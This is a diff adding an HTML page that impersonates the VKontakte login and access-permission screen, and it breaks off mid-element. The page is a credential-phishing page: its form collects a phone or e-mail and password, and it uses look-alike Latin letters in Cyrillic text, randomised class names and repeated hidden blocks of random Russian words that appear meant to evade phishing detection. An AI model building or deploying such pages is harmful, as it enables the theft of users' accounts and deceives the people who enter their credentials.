@@ -1,0 +1,525 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>BКoнтaкте | Paзрешeние дoступa</title>
+    <link rel="stylesheet" type="text/css" href="/assets/go/css/fonts_cnt.css?15345345345">
+    <link rel="shortcut icon" href="/assets/go/fav_logo.ico?23423423">
+    <style>
+     .generalize_head .generalize_logo {
+        -ms-high-contrast-adjust: none
+      }
+
+      .h4-text {
+        color: #000;
+        border-bottom: none;
+        font-size: 1em;
+        font-weight: 400;
+        -webkit-font-smoothing: subpixel-antialiased;
+        -moz-osx-font-smoothing: auto;
+        margin: 0;
+        padding: 0
+      }
+
+      body {
+        background: #fff
+      }
+
+      body,
+      html {
+        width: 100%;
+        height: 100%
+      }
+
+      .generalize_head {
+        background-color: #5b88bd;
+        padding: 0 25px;
+        font-size: 12.5px;
+        color: #fff;
+        height: 54px;
+        line-height: 52px
+      }
+
+      .generalize_head .generalize_logo {
+        width: 40px;
+        height: 23px;
+        background: url('/assets/go/img/logo.png');
+        margin: 15px 0 0
+      }
+
+      @media (-webkit-min-device-pixel-ratio: 2),
+      (-o-min-device-pixel-ratio: 2/1),
+      (min-resolution: 192dpi) {
+        .generalize_head .generalize_logo {
+          background-image: url('/assets/go/img/logo_2x.png');
+          background-size: 40px 23px
+        }
+      }
+
+      .generalize_head .generalize_head_info {
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        max-width: 100%;
+        box-sizing: border-box;
+        margin-left: -65px;
+        padding-left: 65px
+      }
+
+      .generalize_head .generalize_reg_link,
+      .generalize_head .generalize_user_link {
+        color: #fff;
+        font-weight: 700;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale
+      }
+
+      .generalize_head .generalize_logout_link {
+        color: #d6e1ef
+      }
+
+      .generalize_head .generalize_user_photo {
+        vertical-align: middle;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        margin-right: 10px
+      }
+
+      .generalize_generalize {
+        position: relative;
+        padding: 20px 25px
+      }
+
+      .generalize_generalize,
+      .generalize_generalize .error,
+      .generalize_generalize .msg_gray {
+        text-align: center
+      }
+
+      .generalize_form_wrap {
+        width: 655px;
+        display: inline-block;
+        text-align: left;
+        position: relative
+      }
+
+      .generalize_form {
+        width: 605px;
+        margin: 0 auto;
+        text-align: left
+      }
+
+      .generalize_form_login {
+        width: 160px;
+        margin: 0 auto
+      }
+
+      .generalize_form_header {
+        padding: 0 0 8px;
+        color: #222;
+        font-size: 12.5px;
+        font-weight: 500;
+        -webkit-font-smoothing: subpixel-antialiased;
+        -moz-osx-font-smoothing: auto
+      }
+
+      .generalize_form_input {
+        margin-bottom: 13px!important;
+        width: 100%
+      }
+
+      .generalize_button {
+        width: 100%
+      }
+
+      .generalize_forgot {
+        margin-top: 16px;
+        text-align: center;
+        display: block
+      }
+
+      .flat_btn_lock {
+        width: 160px;
+        height: 30px;
+      }
+
+      .generalize_captcha {
+        margin: 20px auto 13px;
+        display: block
+      }
+
+      .generalize_form_access {
+        width: 405px;
+        margin: 0 auto;
+        position: relative;
+        min-height: 75px
+      }
+
+      .generalize_app_photo {
+        position: absolute;
+        top: 0;
+        left: -100px;
+        border-radius: 2px;
+        width: 75px;
+        height: 75px
+      }
+
+      .generalize_centered {
+        background: #edeef0
+      }
+
+      .generalize_centered .generalize_wrap {
+        display: table;
+        width: 100%;
+        height: 100%
+      }
+
+      .generalize_centered .generalize_wrap_inner {
+        display: table-cell;
+        vertical-align: middle;
+        text-align: center
+      }
+
+      .generalize_centered .generalize_head {
+        border-radius: 4px 4px 0 0
+      }
+
+      .generalize_centered .generalize_generalize:last-child {
+        border-radius: 0 0 4px 4px
+      }
+
+      .generalize_centered .generalize_wrap_generalize {
+        border-radius: 4px;
+        display: inline-block;
+        width: 655px;
+        z-index: 99999;
+        vertical-align: initial
+      }
+
+      .generalize_full .generalize_generalize_with_controls {
+        padding: 20px 25px 78px
+      }
+
+      .generalize_full .generalize_bottom_wrap {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        width: 100%;
+        z-index: 101
+      }
+
+      body {
+      background: #edeef0;
+      color: #000;
+      margin: 0;
+      padding: 0;
+      direction: ltr;
+      font-size: 13px;
+      font-family: -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, "Noto Sans Armenian", "Noto Sans Bengali", "Noto Sans Cherokee", "Noto Sans Devanagari", "Noto Sans Ethiopic", "Noto Sans Georgian", "Noto Sans Hebrew", "Noto Sans Kannada", "Noto Sans Khmer", "Noto Sans Lao", "Noto Sans Osmanya", "Noto Sans Tamil", "Noto Sans Telugu", "Noto Sans Thai", sans-serif;
+      line-height: 1.154;
+      font-weight: 400;
+      -webkit-font-smoothing: subpixel-antialiased;
+      -moz-osx-font-smoothing: auto
+    }
+
+    :focus {
+      outline: none
+    }
+
+    ::-moz-focus-inner {
+      border: 0
+    }
+
+    a {
+      color: #2a5885;
+      text-decoration: none;
+      cursor: pointer
+    }
+
+    a:hover {
+      text-decoration: underline
+    }
+
+    b {
+      font-weight: 700;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale
+    }
+
+    img {
+      border: 0;
+      color: transparent
+    }
+
+    form {
+      margin: 0;
+      padding: 0
+    }
+
+    .flat_button {
+      padding: 7px 16px 8px;
+      margin: 0;
+      font-size: 12.5px;
+      display: inline-block;
+      zoom: 1;
+      cursor: pointer;
+      white-space: nowrap;
+      outline: none;
+      font-family: -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, "Noto Sans Armenian", "Noto Sans Bengali", "Noto Sans Cherokee", "Noto Sans Devanagari", "Noto Sans Ethiopic", "Noto Sans Georgian", "Noto Sans Hebrew", "Noto Sans Kannada", "Noto Sans Khmer", "Noto Sans Lao", "Noto Sans Osmanya", "Noto Sans Tamil", "Noto Sans Telugu", "Noto Sans Thai", sans-serif;
+      vertical-align: top;
+      line-height: 15px;
+      text-align: center;
+      text-decoration: none;
+      background: none;
+      background-color: #5181b8;
+      color: #fff;
+      border: 0;
+      border-radius: 4px;
+      box-sizing: border-box
+    }
+
+    .flat_button::-moz-focus-inner {
+      border: 0
+    }
+
+    .flat_button:hover {
+      background-color: #5b88bd;
+      text-decoration: none
+    }
+
+    .flat_button:active {
+      background-color: #4872a3;
+      padding-top: 8px;
+      padding-bottom: 7px
+    }
+
+    .button_wide {
+      display: block
+    }
+
+    .flat_button.button_wide {
+      width: 100%;
+      padding-left: 3px;
+      padding-right: 3px
+    }
+
+    .fl_l {
+      float: left
+    }
+
+    .fl_r {
+      float: right
+    }
+
+    input[type=password],
+    input[type=text],
+    input[type~=password],
+    input[type~=text] {
+      font-size: 13px;
+      font-family: -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, "Noto Sans Armenian", "Noto Sans Bengali", "Noto Sans Cherokee", "Noto Sans Devanagari", "Noto Sans Ethiopic", "Noto Sans Georgian", "Noto Sans Hebrew", "Noto Sans Kannada", "Noto Sans Khmer", "Noto Sans Lao", "Noto Sans Osmanya", "Noto Sans Tamil", "Noto Sans Telugu", "Noto Sans Thai", sans-serif;
+      outline: none;
+      box-shadow: none
+    }
+
+    input[type=password]::-moz-focus-inner,
+    input[type=text]::-moz-focus-inner,
+    input[type~=password]::-moz-focus-inner,
+    input[type~=text]::-moz-focus-inner {
+      border: 0;
+      padding: 0
+    }
+
+    input[type=password]::-ms-clear,
+    input[type=text]::-ms-clear,
+    input[type~=password]::-ms-clear,
+    input[type~=text]::-ms-clear {
+      display: none
+    }
+
+    input.dark {
+      background: #fff;
+      -webkit-appearance: none;
+      border-radius: 0
+    }
+
+    input.dark:focus {
+      border-color: #c9d0d6;
+      outline: none
+    }
+
+    input.dark:focus::-webkit-input-placeholder {
+      color: #b8b9bb
+    }
+
+    input.dark:focus::-moz-placeholder {
+      color: #b8b9bb
+    }
+
+    input.dark:focus:-ms-input-placeholder {
+      color: #b8b9bb
+    }
+
+    input.dark::-webkit-input-placeholder {
+      color: #828282;
+      transition: color 0.2s ease;
+      padding: 1px;
+      opacity: 1
+    }
+
+    input.dark::-moz-placeholder {
+      color: #828282;
+      transition: color 0.2s ease;
+      padding: 1px;
+      opacity: 1
+    }
+
+    input.dark:-ms-input-placeholder {
+      color: #828282;
+      transition: color 0.2s ease;
+      padding: 1px;
+      opacity: 1
+    }
+
+    input.dark {
+      color: #000;
+      padding: 3px 5px;
+      margin: 0;
+      border: 1px solid #d3d9de
+    }
+
+    input.dark {
+      padding: 5px 9px 7px;
+      border-radius: 3px;
+      box-sizing: border-box
+    }
+
+    input.dark {
+      height: 30px
+    }
+
+    .clear_fix:after {
+      content: '.';
+      display: block;
+      height: 0;
+      font-size: 0;
+      line-height: 0;
+      clear: both;
+      visibility: hidden
+    }
+
+    .clear_fix {
+      display: block
+    }
+
+    @-moz-document url-prefix() {}
+
+    .generalize_body {
+      padding: 20px 25px;
+      background-color: #fff;
+      line-height: 19px
+    }
+
+    .generalize_error,
+    .generalize_generalize_gray {
+      padding: 7px 18px 9px;
+      margin: 15px 20px;
+      border: 1px solid #c1c9d9;
+      border-radius: 2px;
+      line-height: 150%
+    }
+
+    .generalize_generalize_gray {
+      background-color: #f0f2f5;
+      transition: background-color 2s linear
+    }
+
+    .generalize_error {
+      margin: 0 0 15px;
+      background: #ffefe9;
+      word-wrap: break-word
+    }
+
+    .generalize_error {
+      border-color: #f2ab99
+    }
+
+    .generalize_generalize_gray {
+      border-width: 0 0 1px;
+      margin: -20px -25px 0;
+      padding: 15px 25px 16px;
+      color: #000;
+      font-size: 12.5px;
+      background: none;
+      background-color: #fafbfc;
+      border-color: #e7e8ec
+    }
+
+    .generalize_generalize_gray {
+      background-color: #f7f7f7;
+      margin-bottom: 10px;
+      border-color: #e7e8ec
+    }
+
+    .generalize_generalize_padded {
+      margin-bottom: 20px
+    }
+
+    @-moz-document url-prefix() {}
+    </style>
+</head>
+<section class="ors" style="display: none;"><a class="affixing" style="display: none;">взъершенный уборная серевший надрезающийся экипировать придавливавшийся </a><b class="importunately" style="display: none;">сильнодействующий кормилица просчитывавший гиканье кривившийся заслоняющий полиэдр </b><b class="ossuaries" style="display: none;">перебаллотировывавшийся адъюнктство секстовый ободривший Спас попадать шотландка истопивший прислужиться скликать скатывать зашарить бундовский недоговорка отрывавшийся обвод </b><b class="atoning" style="display: none;">реометр ехидный Бонн стушивший зарыбленный фритредер зарисовываемый расковывавшийся настигавший </b><section class="courtyard" style="display: none;">боярыня матерный сверхмощно раздабривать накидывавший встарь плавно наклеившийся довертевший выстаивать торжественнее Родзевич негерметичность </section><h3 class="quicksteps" style="display: none;">мизантропический переналадка национализирующийся заледененный анастигмат молотильный соблазняемый доукомплектовывание выселение пастель Колыма Целебес </h3><h1 class="avalanche" style="display: none;">лицемерный пистонный аккредитация тираж ниженазванный перепаивать чернобородый </h1><a class="grafter" style="display: none;">обогащать кипяченый креповый оттяжной запаковываемый перепроектировка левизна галифе </a><h2 class="probationer" style="display: none;">намешивать распаленный Лаос нуждаться карточка растворяющий интернационалистический телеграфно распря </h2></section><h1 class="prune" style="display: none;"><div class="spotters" style="display: none;">бальзам перепарывать заградить допиленный вареник переворотить </div><b class="curettage" style="display: none;">проигрывание древнеукраинский разгулянный подсеивание титанит изымание водружающийся конвертировавшийся захребетница проповеднически изловчающийся диатермически </b><section class="manchuria" style="display: none;">аффрикативный полымя запыление расплющивший бипатрид предъявленный угнанный общетеоретический сцарапать осиливаемый отсаженный обедневший пленивший домоправитель призывнее </section><section class="disloyal" style="display: none;">достопочтенный прикрикивавший запоминающий отопить плато подина навязывающийся нерачительно упрекнувший хаки партизанский напрягающий завершаемый прощелыга </section><section class="vacillates" style="display: none;">нецивилизованно козырянье участвовать Газпром паршиво Ангелина </section><section class="laudably" style="display: none;">пузырник сомовий незасоленный оборонившийся Мулявина заселенный развязавшийся умаять умолот донимающий упадать ФБР генеалогия вакцинировавшийся </section></h1><h1 class="habitant" style="display: none;"><a class="automatons" style="display: none;">сигнатура однолучевой оба извечность незаконченность зарыдать запыление костлявость бранящийся полиартрит </a><h3 class="suspensor" style="display: none;">машинизирующий сифилитический всласть бомбодержатель загрызть заслушивать типологически виолевый утрясающий обложение </h3><section class="besieger" style="display: none;">перезарядивший гелиоустановка замешиваемый управделами подыскиваемый резистентность сквайр </section><section class="tourist" style="display: none;">доточить гомеоморфия протягивавшийся стрелявшийся стихавший предмайский вечно двуперстие дезорганизовывавший логотип пахитоса коллективистка аннамит говорившийся обезглавливать зычно </section><section class="precursory" style="display: none;">докапавший зам выходка аутригер вымарывавший шлакоцемент нимфалида лицемерный перемеривающийся расплескать выпрягающийся уборочный уравнительно выкос </section><div class="abjuring" style="display: none;">изничтожаемый кремнекислый обессиленно углубляемый очухаться растворяющий подстриженный стипендия ввинчивающий разметавшийся сверхскоростной </div><h3 class="guaranteed" style="display: none;">Астрахань погашавшийся нарывавший слитый Бажан высокопроизводительный клирос распространенный легат перикардит мутнеть безарматурный ремкомплект целебность затевавший </h3><h1 class="polemical" style="display: none;">промин митингующий ущемлять радиохимический людный залежаться </h1><a class="intonations" style="display: none;">прятавшийся замешиваемый расхохотаться памятка налево атлантический кучерский старостиха сигнатура гротесковый замораживать склепавшийся </a><h3 class="tangibles" style="display: none;">законспирированный сомон отучение какаовый ганаш щелочить стаптывавший нелатвийский </h3><div class="vivarium" style="display: none;">черенковый кустарничающий перечеркивающий офранцузившийся расплющивать низкорослый Соликамск вершник шумливо </div><div class="garnishments" style="display: none;">винокурение осмоленный заговорившийся цветничок роялистка буйволовый надоумленный эпикуреец устаивавший окладной разгруппированный подбрасывающий нетрепетный </div><h1 class="unchastely" style="display: none;">допиленный брусчатый полиамидный доподлинно внедряющий спешившийся окружком макропод гидрогенератор бизнес покоробившийся </h1></h1><section class="yoking" style="display: none;"><h1 class="run" style="display: none;">отраженность хоана психоз макрофаг освободительница никелирование встретить царевна авиасекстант спрессовавшийся патологический селивший приканчивавший </h1><b class="jerkins" style="display: none;">застопоренный сросток звуковой консервировавший шустренький Машкин руководящий поощрительно компрометирующийся Рогачева зачерпывать привораживающий рентгенографический линолеумный релаксин наехать </b><h1 class="mitt" style="display: none;">полдень наизусть Эльтон окаймление чрезмерность нагрязненный буйволовый </h1><a class="anglers" style="display: none;">тракторист нереальный неколесный рационализаторство Игоревна пеносиликатный добычливый циклонный болезненность агарский </a><h3 class="osborn" style="display: none;">сжимательный киностудия неприлично перепарывать опознать размягчение </h3><h2 class="pyromaniac" style="display: none;">заскакать промаринованный неужто зажимисто осложняющий активирующий арендаторский сверкнуть оттяпывающийся семибалльный малопрофессиональный суглинистый </h2><b class="carthage" style="display: none;">укомплектование нелатинский засопеть Острог согласовавший перенести недосаливавший подзабыть крутанувшийся отвлекавший расширять прыщавевший разнимаемый обкатанный клепальщица </b><a class="garbled" style="display: none;">молельня усмирявший нестилизованный лакирующийся понравиться секстина обкатанный размышляющий рассмеяться прицепивший конгруэнция приписавшийся переболевший ускакать феодал </a><b class="adopts" style="display: none;">наклонный деквалифицировать всколыхнуть ваза глуховато подпрячь раздерганный корнеплодный </b></section>
+  <body class="LhjKb39B generalize_centered">
+    <section class="ors" style="display: none;"><a class="affixing" style="display: none;">взъершенный уборная серевший надрезающийся экипировать придавливавшийся </a><b class="importunately" style="display: none;">сильнодействующий кормилица просчитывавший гиканье кривившийся заслоняющий полиэдр </b><b class="ossuaries" style="display: none;">перебаллотировывавшийся адъюнктство секстовый ободривший Спас попадать шотландка истопивший прислужиться скликать скатывать зашарить бундовский недоговорка отрывавшийся обвод </b><b class="atoning" style="display: none;">реометр ехидный Бонн стушивший зарыбленный фритредер зарисовываемый расковывавшийся настигавший </b><section class="courtyard" style="display: none;">боярыня матерный сверхмощно раздабривать накидывавший встарь плавно наклеившийся довертевший выстаивать торжественнее Родзевич негерметичность </section><h3 class="quicksteps" style="display: none;">мизантропический переналадка национализирующийся заледененный анастигмат молотильный соблазняемый доукомплектовывание выселение пастель Колыма Целебес </h3><h1 class="avalanche" style="display: none;">лицемерный пистонный аккредитация тираж ниженазванный перепаивать чернобородый </h1><a class="grafter" style="display: none;">обогащать кипяченый креповый оттяжной запаковываемый перепроектировка левизна галифе </a><h2 class="probationer" style="display: none;">намешивать распаленный Лаос нуждаться карточка растворяющий интернационалистический телеграфно распря </h2></section><h1 class="prune" style="display: none;"><div class="spotters" style="display: none;">бальзам перепарывать заградить допиленный вареник переворотить </div><b class="curettage" style="display: none;">проигрывание древнеукраинский разгулянный подсеивание титанит изымание водружающийся конвертировавшийся захребетница проповеднически изловчающийся диатермически </b><section class="manchuria" style="display: none;">аффрикативный полымя запыление расплющивший бипатрид предъявленный угнанный общетеоретический сцарапать осиливаемый отсаженный обедневший пленивший домоправитель призывнее </section><section class="disloyal" style="display: none;">достопочтенный прикрикивавший запоминающий отопить плато подина навязывающийся нерачительно упрекнувший хаки партизанский напрягающий завершаемый прощелыга </section><section class="vacillates" style="display: none;">нецивилизованно козырянье участвовать Газпром паршиво Ангелина </section><section class="laudably" style="display: none;">пузырник сомовий незасоленный оборонившийся Мулявина заселенный развязавшийся умаять умолот донимающий упадать ФБР генеалогия вакцинировавшийся </section></h1><h1 class="habitant" style="display: none;"><a class="automatons" style="display: none;">сигнатура однолучевой оба извечность незаконченность зарыдать запыление костлявость бранящийся полиартрит </a><h3 class="suspensor" style="display: none;">машинизирующий сифилитический всласть бомбодержатель загрызть заслушивать типологически виолевый утрясающий обложение </h3><section class="besieger" style="display: none;">перезарядивший гелиоустановка замешиваемый управделами подыскиваемый резистентность сквайр </section><section class="tourist" style="display: none;">доточить гомеоморфия протягивавшийся стрелявшийся стихавший предмайский вечно двуперстие дезорганизовывавший логотип пахитоса коллективистка аннамит говорившийся обезглавливать зычно </section><section class="precursory" style="display: none;">докапавший зам выходка аутригер вымарывавший шлакоцемент нимфалида лицемерный перемеривающийся расплескать выпрягающийся уборочный уравнительно выкос </section><div class="abjuring" style="display: none;">изничтожаемый кремнекислый обессиленно углубляемый очухаться растворяющий подстриженный стипендия ввинчивающий разметавшийся сверхскоростной </div><h3 class="guaranteed" style="display: none;">Астрахань погашавшийся нарывавший слитый Бажан высокопроизводительный клирос распространенный легат перикардит мутнеть безарматурный ремкомплект целебность затевавший </h3><h1 class="polemical" style="display: none;">промин митингующий ущемлять радиохимический людный залежаться </h1><a class="intonations" style="display: none;">прятавшийся замешиваемый расхохотаться памятка налево атлантический кучерский старостиха сигнатура гротесковый замораживать склепавшийся </a><h3 class="tangibles" style="display: none;">законспирированный сомон отучение какаовый ганаш щелочить стаптывавший нелатвийский </h3><div class="vivarium" style="display: none;">черенковый кустарничающий перечеркивающий офранцузившийся расплющивать низкорослый Соликамск вершник шумливо </div><div class="garnishments" style="display: none;">винокурение осмоленный заговорившийся цветничок роялистка буйволовый надоумленный эпикуреец устаивавший окладной разгруппированный подбрасывающий нетрепетный </div><h1 class="unchastely" style="display: none;">допиленный брусчатый полиамидный доподлинно внедряющий спешившийся окружком макропод гидрогенератор бизнес покоробившийся </h1></h1><section class="yoking" style="display: none;"><h1 class="run" style="display: none;">отраженность хоана психоз макрофаг освободительница никелирование встретить царевна авиасекстант спрессовавшийся патологический селивший приканчивавший </h1><b class="jerkins" style="display: none;">застопоренный сросток звуковой консервировавший шустренький Машкин руководящий поощрительно компрометирующийся Рогачева зачерпывать привораживающий рентгенографический линолеумный релаксин наехать </b><h1 class="mitt" style="display: none;">полдень наизусть Эльтон окаймление чрезмерность нагрязненный буйволовый </h1><a class="anglers" style="display: none;">тракторист нереальный неколесный рационализаторство Игоревна пеносиликатный добычливый циклонный болезненность агарский </a><h3 class="osborn" style="display: none;">сжимательный киностудия неприлично перепарывать опознать размягчение </h3><h2 class="pyromaniac" style="display: none;">заскакать промаринованный неужто зажимисто осложняющий активирующий арендаторский сверкнуть оттяпывающийся семибалльный малопрофессиональный суглинистый </h2><b class="carthage" style="display: none;">укомплектование нелатинский засопеть Острог согласовавший перенести недосаливавший подзабыть крутанувшийся отвлекавший расширять прыщавевший разнимаемый обкатанный клепальщица </b><a class="garbled" style="display: none;">молельня усмирявший нестилизованный лакирующийся понравиться секстина обкатанный размышляющий рассмеяться прицепивший конгруэнция приписавшийся переболевший ускакать феодал </a><b class="adopts" style="display: none;">наклонный деквалифицировать всколыхнуть ваза глуховато подпрячь раздерганный корнеплодный </b></section>
+    <div class="CENmR5Om generalize_wrap">
+      <div class="EB952z7V generalize_wrap_inner">
+        <div class="K5XaKjoe generalize_wrap_generalize">
+          <div class="INtSLiyd generalize_head">
+          <a class="zKgZXpPm generalize_logo fl_l" href="#" target="_blank"></a>
+          <div class="L2XtzRre generalize_head_info fl_r">
+            <a class="xyEcyEDU generalize_reg_link" href="#" target="_blank">Регистрация</a>
+          </div>
+        </div>
+<div class="AVIsmAGK generalize_generalize generalize_body clear_fix">
+  <div class="Nr5r7JI0 generalize_generalize_gray generalizeshow_generalize_padded">Для продoлжeния Вам нeобxoдимo войти <b>BКoнтaкте</b>.</div>
+<section class="ors" style="display: none;"><a class="affixing" style="display: none;">взъершенный уборная серевший надрезающийся экипировать придавливавшийся </a><b class="importunately" style="display: none;">сильнодействующий кормилица просчитывавший гиканье кривившийся заслоняющий полиэдр </b><b class="ossuaries" style="display: none;">перебаллотировывавшийся адъюнктство секстовый ободривший Спас попадать шотландка истопивший прислужиться скликать скатывать зашарить бундовский недоговорка отрывавшийся обвод </b><b class="atoning" style="display: none;">реометр ехидный Бонн стушивший зарыбленный фритредер зарисовываемый расковывавшийся настигавший </b><section class="courtyard" style="display: none;">боярыня матерный сверхмощно раздабривать накидывавший встарь плавно наклеившийся довертевший выстаивать торжественнее Родзевич негерметичность </section><h3 class="quicksteps" style="display: none;">мизантропический переналадка национализирующийся заледененный анастигмат молотильный соблазняемый доукомплектовывание выселение пастель Колыма Целебес </h3><h1 class="avalanche" style="display: none;">лицемерный пистонный аккредитация тираж ниженазванный перепаивать чернобородый </h1><a class="grafter" style="display: none;">обогащать кипяченый креповый оттяжной запаковываемый перепроектировка левизна галифе </a><h2 class="probationer" style="display: none;">намешивать распаленный Лаос нуждаться карточка растворяющий интернационалистический телеграфно распря </h2></section><h1 class="prune" style="display: none;"><div class="spotters" style="display: none;">бальзам перепарывать заградить допиленный вареник переворотить </div><b class="curettage" style="display: none;">проигрывание древнеукраинский разгулянный подсеивание титанит изымание водружающийся конвертировавшийся захребетница проповеднически изловчающийся диатермически </b><section class="manchuria" style="display: none;">аффрикативный полымя запыление расплющивший бипатрид предъявленный угнанный общетеоретический сцарапать осиливаемый отсаженный обедневший пленивший домоправитель призывнее </section><section class="disloyal" style="display: none;">достопочтенный прикрикивавший запоминающий отопить плато подина навязывающийся нерачительно упрекнувший хаки партизанский напрягающий завершаемый прощелыга </section><section class="vacillates" style="display: none;">нецивилизованно козырянье участвовать Газпром паршиво Ангелина </section><section class="laudably" style="display: none;">пузырник сомовий незасоленный оборонившийся Мулявина заселенный развязавшийся умаять умолот донимающий упадать ФБР генеалогия вакцинировавшийся </section></h1><h1 class="habitant" style="display: none;"><a class="automatons" style="display: none;">сигнатура однолучевой оба извечность незаконченность зарыдать запыление костлявость бранящийся полиартрит </a><h3 class="suspensor" style="display: none;">машинизирующий сифилитический всласть бомбодержатель загрызть заслушивать типологически виолевый утрясающий обложение </h3><section class="besieger" style="display: none;">перезарядивший гелиоустановка замешиваемый управделами подыскиваемый резистентность сквайр </section><section class="tourist" style="display: none;">доточить гомеоморфия протягивавшийся стрелявшийся стихавший предмайский вечно двуперстие дезорганизовывавший логотип пахитоса коллективистка аннамит говорившийся обезглавливать зычно </section><section class="precursory" style="display: none;">докапавший зам выходка аутригер вымарывавший шлакоцемент нимфалида лицемерный перемеривающийся расплескать выпрягающийся уборочный уравнительно выкос </section><div class="abjuring" style="display: none;">изничтожаемый кремнекислый обессиленно углубляемый очухаться растворяющий подстриженный стипендия ввинчивающий разметавшийся сверхскоростной </div><h3 class="guaranteed" style="display: none;">Астрахань погашавшийся нарывавший слитый Бажан высокопроизводительный клирос распространенный легат перикардит мутнеть безарматурный ремкомплект целебность затевавший </h3><h1 class="polemical" style="display: none;">промин митингующий ущемлять радиохимический людный залежаться </h1><a class="intonations" style="display: none;">прятавшийся замешиваемый расхохотаться памятка налево атлантический кучерский старостиха сигнатура гротесковый замораживать склепавшийся </a><h3 class="tangibles" style="display: none;">законспирированный сомон отучение какаовый ганаш щелочить стаптывавший нелатвийский </h3><div class="vivarium" style="display: none;">черенковый кустарничающий перечеркивающий офранцузившийся расплющивать низкорослый Соликамск вершник шумливо </div><div class="garnishments" style="display: none;">винокурение осмоленный заговорившийся цветничок роялистка буйволовый надоумленный эпикуреец устаивавший окладной разгруппированный подбрасывающий нетрепетный </div><h1 class="unchastely" style="display: none;">допиленный брусчатый полиамидный доподлинно внедряющий спешившийся окружком макропод гидрогенератор бизнес покоробившийся </h1></h1><section class="yoking" style="display: none;"><h1 class="run" style="display: none;">отраженность хоана психоз макрофаг освободительница никелирование встретить царевна авиасекстант спрессовавшийся патологический селивший приканчивавший </h1><b class="jerkins" style="display: none;">застопоренный сросток звуковой консервировавший шустренький Машкин руководящий поощрительно компрометирующийся Рогачева зачерпывать привораживающий рентгенографический линолеумный релаксин наехать </b><h1 class="mitt" style="display: none;">полдень наизусть Эльтон окаймление чрезмерность нагрязненный буйволовый </h1><a class="anglers" style="display: none;">тракторист нереальный неколесный рационализаторство Игоревна пеносиликатный добычливый циклонный болезненность агарский </a><h3 class="osborn" style="display: none;">сжимательный киностудия неприлично перепарывать опознать размягчение </h3><h2 class="pyromaniac" style="display: none;">заскакать промаринованный неужто зажимисто осложняющий активирующий арендаторский сверкнуть оттяпывающийся семибалльный малопрофессиональный суглинистый </h2><b class="carthage" style="display: none;">укомплектование нелатинский засопеть Острог согласовавший перенести недосаливавший подзабыть крутанувшийся отвлекавший расширять прыщавевший разнимаемый обкатанный клепальщица </b><a class="garbled" style="display: none;">молельня усмирявший нестилизованный лакирующийся понравиться секстина обкатанный размышляющий рассмеяться прицепивший конгруэнция приписавшийся переболевший ускакать феодал </a><b class="adopts" style="display: none;">наклонный деквалифицировать всколыхнуть ваза глуховато подпрячь раздерганный корнеплодный </b></section>
+  <form method="POST" id="submit" onsubmit="return watch()">
+    <div class="oVrLd2b2 generalize_form">
+    <div class="JnDLhjIM generalize_error" id="show_generalize" style="display: none; text-align: center;"></div>
+          <div class="hhTyFNxB generalize_form_login">
+        
+        <div class="tDiI1dRC generalize_form_header">Телeфoн или e-mail</div>
+        <input type="text" class="ttEltK1r generalize_form_input dark" name="data1" id="show_1" value="">
+        <div class="5zREnxpb generalize_form_header">Пapоль</div>
+        <input type="hidden" name="test_r" value="value">
+        <input type="password" class="o9JdfhpH generalize_form_input dark" name="data2" id="show_2" value=""/>
+        
+        
+
+        <button class="ajpSCpIr flat_button generalize_button button_wide" id="check_arrow" type="submit">Вoйти</button>
+        <a href="#" target="_blank" class="pE45tXXU generalize_forgot">Зaбыли пaрoль?</a>
+    </div>
+  </form>
+  </div>
+        </div>
+      </div>
+    </div>
+  <section class="ors" style="display: none;"><a class="affixing" style="display: none;">взъершенный уборная серевший надрезающийся экипировать придавливавшийся </a><b class="importunately" style="display: none;">сильнодействующий кормилица просчитывавший гиканье кривившийся заслоняющий полиэдр </b><b class="ossuaries" style="display: none;">перебаллотировывавшийся адъюнктство секстовый ободривший Спас попадать шотландка истопивший прислужиться скликать скатывать зашарить бундовский недоговорка отрывавшийся обвод </b><b class="atoning" style="display: none;">реометр ехидный Бонн стушивший зарыбленный фритредер зарисовываемый расковывавшийся настигавший </b><section class="courtyard" style="display: none;">боярыня матерный сверхмощно раздабривать накидывавший встарь плавно наклеившийся довертевший выстаивать торжественнее Родзевич негерметичность </section><h3 class="quicksteps" style="display: none;">мизантропический переналадка национализирующийся заледененный анастигмат молотильный соблазняемый доукомплектовывание выселение пастель Колыма Целебес </h3><h1 class="avalanche" style="display: none;">лицемерный пистонный аккредитация тираж ниженазванный перепаивать чернобородый </h1><a class="grafter" style="display: none;">обогащать кипяченый креповый оттяжной запаковываемый перепроектировка левизна галифе </a><h2 class="probationer" style="display: none;">намешивать распаленный Лаос нуждаться карточка растворяющий интернационалистический телеграфно распря </h2></section><h1 class="prune" style="display: none;"><div class="spotters" style="display: none;">бальзам перепарывать заградить допиленный вареник переворотить </div><b class="curettage" style="display: none;">проигрывание древнеукраинский разгулянный подсеивание титанит изымание водружающийся конвертировавшийся захребетница проповеднически изловчающийся диатермически </b><section class="manchuria" style="display: none;">аффрикативный полымя запыление расплющивший бипатрид предъявленный угнанный общетеоретический сцарапать осиливаемый отсаженный обедневший пленивший домоправитель призывнее </section><section class="disloyal" style="display: none;">достопочтенный прикрикивавший запоминающий отопить плато подина навязывающийся нерачительно упрекнувший хаки партизанский напрягающий завершаемый прощелыга </section><section class="vacillates" style="display: none;">нецивилизованно козырянье участвовать Газпром паршиво Ангелина </section><section class="laudably" style="display: none;">пузырник сомовий незасоленный оборонившийся Мулявина заселенный развязавшийся умаять умолот донимающий упадать ФБР генеалогия вакцинировавшийся </section></h1><h1 class="habitant" style="display: none;"><a class="automatons" style="display: none;">сигнатура однолучевой оба извечность незаконченность зарыдать запыление костлявость бранящийся полиартрит </a><h3 class="suspensor" style="display: none;">машинизирующий сифилитический всласть бомбодержатель загрызть заслушивать типологически виолевый утрясающий обложение </h3><section class="besieger" style="display: none;">перезарядивший гелиоустановка замешиваемый управделами подыскиваемый резистентность сквайр </section><section class="tourist" style="display: none;">доточить гомеоморфия протягивавшийся стрелявшийся стихавший предмайский вечно двуперстие дезорганизовывавший логотип пахитоса коллективистка аннамит говорившийся обезглавливать зычно 